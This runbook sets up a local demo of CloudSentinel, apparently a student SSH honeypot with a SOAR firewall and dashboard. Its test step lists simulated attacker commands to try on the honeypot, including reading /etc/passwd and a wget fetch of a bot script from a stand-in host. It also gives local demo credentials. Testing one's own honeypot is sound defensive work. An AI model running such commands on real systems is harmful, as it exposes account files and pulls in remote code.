# Local Demo (Zero Cost)

This runbook runs the full CloudSentinel stack on your own machine. No cloud server is needed.

## What you need

- Windows 10 or 11 with WSL2 enabled. `wsl --status` shows version 2.
- Docker Desktop, free for students and personal use.
- Node.js 22. Already installed in this project.
- About 4 GB of free RAM and 3 GB of disk for the first build.

If Docker cannot be installed, see the minimal path at the end.

## Path A: Docker Desktop (recommended)

### 1. Install Docker Desktop

Install Docker Desktop, start it, and enable the WSL2 backend. Wait until it says Docker is running.

Check:

```powershell
docker --version
docker compose version
```

### 2. Create the sensor env file

```powershell
cd "C:\Users\RADZ\project io\FYP\src\cloudsentinel"
Copy-Item .env.example .env
```

Open `.env` and set these values:

```ini
REDIS_PASSWORD=cloudsentinel_redis
CLICKHOUSE_ENABLED=true
CLICKHOUSE_HOST=clickhouse
CLICKHOUSE_USERNAME=cloudsentinel
CLICKHOUSE_PASSWORD=cloudsentinel_ch_pass
NATS_ENABLED=false
SOAR_FIREWALL_ENABLED=true
SOAR_FIREWALL_DRY_RUN=true
SOAR_ACTIVE_PROFILE=local
ADMIN_ENABLED=true
STREAM_ENABLED=true
```

`SOAR_FIREWALL_DRY_RUN=true` is important. It stops the local sensor from changing your Windows or WSL firewall.

### 3. Start the stack

```powershell
docker compose --profile dev up -d --build
```

First build takes 5 to 10 minutes because it installs the sensor image.

Check:

```powershell
docker compose ps
curl http://localhost:8080/healthz
```

Expected: `ok: true`, Redis connected, and a pending event count.

### 4. Connect to the honeypot

Open a second terminal:

```powershell
ssh -p 2222 root@localhost
```

Use any password. The honeypot accepts it on purpose. Try:

```text
whoami
uname -a
cat /etc/passwd
wget http://example.com/bot.sh
```

The commands are simulated by the VFS and scored by SOAR.

### 5. Run the dashboard

```powershell
cd "C:\Users\RADZ\project io\FYP\dashboard"
npm install
```

A ready local file is at `dashboard/.env.local`:

```ini
CLOUDSENTINEL_ADMIN_API_URL=http://localhost:8080
CLOUDSENTINEL_ADMIN_TOKEN=local-demo-admin-token
NEXT_PUBLIC_CLOUDSENTINEL_SOCKET_URL=http://localhost:3001
DASHBOARD_USERNAME=admin
DASHBOARD_PASSWORD=local-demo-password
DASHBOARD_AUTH_SECRET=local-demo-secret-change-me
```

Start it:

```powershell
npm run dev
```

Open `http://localhost:3000/signin`.

Use `admin` and `local-demo-password`. The Cloudflare Turnstile test widget passes automatically. The six-digit OTP is printed in the Next.js terminal because no Resend key is set.

### 6. Generate demo traffic

Open a third terminal:

```powershell
cd "C:\Users\RADZ\project io\FYP\src\cloudsentinel"
python stress_test.py --host 127.0.0.1 --port 2222 --connections 20
```

`127.0.0.1` is allowlisted, so SOAR will not block it. Events still go to Redis and ClickHouse, so the dashboard gets data.

### 7. Stop

```powershell
cd "C:\Users\RADZ\project io\FYP\src\cloudsentinel"
docker compose down
```

Add `-v` only if you want to delete the local Redis and ClickHouse data:

```powershell
docker compose down -v
```

## Path B: No Docker (minimal demo)

Use this only if Docker cannot be installed. You get the SSH honeypot, the admin API, and the live stream, but the dashboard will have no event history.

A ready local env file is at `src/cloudsentinel/.env.local`. It listens on `127.0.0.1` only, uses dry-run firewall mode, and sets a local admin token.

Run from the repo root:

```powershell
cd "C:\Users\RADZ\project io\FYP"
.\scripts\run_local.ps1
```

The sensor starts on port `2222`. Redis is not required because the pipeline falls back to the local WAL. The first start takes about 20 seconds while the Redis connection times out. The admin API is on `http://localhost:8080` and the live stream is on `http://localhost:3001`.

Test:

```powershell
ssh -p 2222 root@localhost
```

This path is enough to show the honeypot and command simulation. The dashboard can show live stream events, but event history is empty because ClickHouse is disabled. Use Path A for the full dashboard.

## Zero-cost live MTTB

If you want a real firewall measurement without a cloud server, run the benchmark inside a Linux VM or WSL2 with admin rights. Use TEST-NET-3 IPs only:

```bash
python -m cloudsentinel.mttb_benchmark \
  --active \
  --source-ip 203.0.113.10 \
  --iterations 10 \
  --risk-threshold 30 \
  --target-ms 100 \
  --firewall-path /usr/sbin/iptables
```

Then delete the test rule:

```bash
iptables -D INPUT -s 203.0.113.10 -j DROP
```

Do not run `--active` on a shared machine without a cleanup step.

## Cost

RM0. The only cost is disk space and electricity.
